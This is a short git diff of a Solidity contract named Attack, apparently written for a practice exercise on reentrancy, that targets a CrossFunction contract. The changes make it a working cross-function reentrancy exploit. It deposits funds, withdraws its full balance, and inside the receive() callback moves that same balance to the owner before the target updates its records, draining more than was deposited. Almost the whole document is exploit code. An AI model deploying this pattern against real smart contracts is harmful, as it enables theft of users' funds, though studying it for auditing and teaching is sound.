@@ -4,8 +4,6 @@ import {CrossFunction} from "./CrossFunction.sol";
 
 contract Attack {
     CrossFunction crossFunction;
-
-    uint256 public constant AMOUNT = 1 ether;
     address owner;
 
     constructor(CrossFunction _crossFunction, address _owner) {
@@ -14,16 +12,16 @@ contract Attack {
     }
 
     function deposit() payable external {
-        require(msg.value >= AMOUNT, "MAKE ENOUGH DePOSIT");
-        crossFunction.deposit{value: AMOUNT}();
+        crossFunction.deposit{value: msg.value}();
     }
 
     function withdraw() external {
-        crossFunction.withdraw(AMOUNT);
+        uint256 crossFunctionBalance = crossFunction.getBalance(address(this));
+        crossFunction.withdraw(crossFunctionBalance);
     }
 
     receive() payable external {
-    //     uint256 crossFunctionBalance = crossFunction.getBalance(address(this));
-    //     crossFunction.transfer(owner, crossFunctionBalance);
+        uint256 balance = crossFunction.getBalance(address(this));
+        crossFunction.transfer(owner, balance);
      }
 }
